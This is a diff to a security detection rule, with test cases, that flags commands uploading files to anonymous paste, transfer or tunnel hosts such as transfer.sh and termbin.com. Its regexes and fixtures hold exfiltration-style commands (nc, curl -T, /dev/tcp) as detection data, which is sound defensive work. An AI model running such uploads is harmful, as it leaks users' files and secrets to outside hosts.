@@ -1,6 +1,6 @@
 id: upload-to-paste-transfer-site
 spec: threat-rules/v1.3  # needed for predicates
-version: 4
+version: 5
 title: Upload to an anonymous paste/transfer/tunnel host or a gist
 description: >
   A command POSTs or uploads file content to a well-known anonymous file-drop,
@@ -13,8 +13,11 @@ description: >
   egress rules share (curl, wget, httpie, xh, nc, ncat, netcat, socat, by any path,
   under sudo, timeout or torsocks, or inside bash -c) given one of these hosts as an
   argument, or a bash /dev/tcp redirect to one. The command line is read as bash, so
-  the same text inside a commit message, an echo or a grep pattern does not fire; a
-  command line that does not parse falls back to matching its text.
+  the same text inside a commit message, an echo or a grep pattern does not fire;
+  where the parser cannot see into a command (a line that does not parse or was cut,
+  a script handed the upload as its argument), the text that reaches that command is
+  matched instead (unread_text), and there too the sender is one of those clients
+  named as a command.
 severity: high
 status: stable
 posture: detect
@@ -32,11 +35,10 @@ match: >
       s.argv_raw.exists(a, a.matches("(?i)(^|[/@.:=\\x27\"])(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)([/:,?\\x27\"]|$)")) ||
       s.name == "gh" && s.argv.exists(a, a == "gist") && s.argv.exists(a, a == "create") ||
       s.socket_redirects.exists(r, r.path.matches("(?i)^/dev/(tcp|udp)/(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)/"))) ||
-    (size(e.command.parsed_commands) == 0 && (
-      e.command.command.matches("(?i)\\b(curl|wget|http|httpie)\\b") &&
-        e.command.command.matches("(?i)\\b(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)\\b") ||
-      e.command.command.matches("(?i)\\bgh\\s+gist\\s+create\\b") ||
-      e.command.command.matches("(?i)[<>][&|]?\\s*/dev/(tcp|udp)/(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)/")))
+    unread_text(e, t,
+      t.matches("(?i)\\b(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)\\b") &&
+        egress_sender_mention(t) ||
+      t.matches("(?i)\\bgh\\s+gist\\s+create\\b|[<>][&|]?\\s*/dev/(tcp|udp)/(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)/"))
   )
 emit:
   reason: "Outbound upload to an anonymous paste/transfer/tunnel host"
@@ -171,4 +173,36 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "open http://termbin.com/abcd" }
+        session: { id: s1 }
+  - name: nc_termbin_given_to_a_project_script
+    # The text half named curl, wget and HTTPie only until version 5, not the nc termbin
+    # documents.
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "./share.sh 'cat build.log | nc termbin.com 9999'" }
+        session: { id: s1 }
+  - name: capture_cut_inside_a_loop
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "cd /srv && for f in a b; do curl -T $f https://transfer.sh/$f" }
+        session: { id: s1 }
+  - name: upload_in_a_comment
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "# curl -T build.log https://transfer.sh/build.log" }
+        session: { id: s1 }
+  - name: upload_in_a_commit_message_beside_a_project_script
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m 'never curl -T x https://transfer.sh/x' && ./run-tests.sh" }
+        session: { id: s1 }
+  - name: paste_url_handed_to_a_program_the_parser_cannot_see_into
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "xdg-open http://termbin.com/abcd" }
         session: { id: s1 }
